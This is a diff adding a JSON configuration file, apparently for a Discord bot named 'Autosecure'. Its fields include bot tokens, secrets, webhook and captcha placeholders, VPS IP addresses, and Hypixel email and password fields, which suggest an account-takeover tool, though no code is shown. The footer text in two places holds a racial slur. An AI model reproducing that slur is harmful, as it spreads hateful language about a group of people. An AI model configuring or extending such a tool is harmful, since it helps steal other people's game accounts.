@@ -1,0 +1,51 @@
+{
+  "tokens": [
+    ""
+  ],
+  "domains": [
+    ""
+  ],
+  "domain": [
+    ""
+  ],
+  "owners": [
+    "1456875723494002908",
+    ""
+  ],
+  "novps": "False",
+  "useproxy": "False",
+  "proxy": [],
+  "discordServer": "https://discord.gg/",
+  "authkey": "AUTH_KEY",
+  "transcripts": "",
+  "trial": "12h",
+  "jwtsecret": "JWT_SECRET",
+  "defaultpfp": "",
+  "captchakey": "CAPTCHA_KEY",
+  "botslotslink": "",
+  "notifierWebhook": "",
+  "guildid": "",
+  "welcomechannel": "",
+  "leaderboard": "",
+  "log": "",
+  "footer1": "nigga",
+  "shoplink": "",
+  "roleid": "",
+  "memberrole": "",
+  "ip6": "2a0e:97c0:3e3:2e1::1",
+  "ip4": "45.133.74.43",
+  "hypixelemail": "",
+  "hypixelpassword": "",
+  "ticketcategory": "",
+  "vpsip": "45.133.74.43",
+  "vpsip2": "2a0e:97c0:3e3:2e1::1",
+  "footer": {
+    "text": "nigga Autosecure",
+    "icon_url": ""
+  },
+  "blockedEmails": [],
+  "ignoreEmails": [],
+  "ownerrole": "1497853245354147910",
+  "smtpHost": "0.0.0.0",
+  "apiPort": 8080
+}
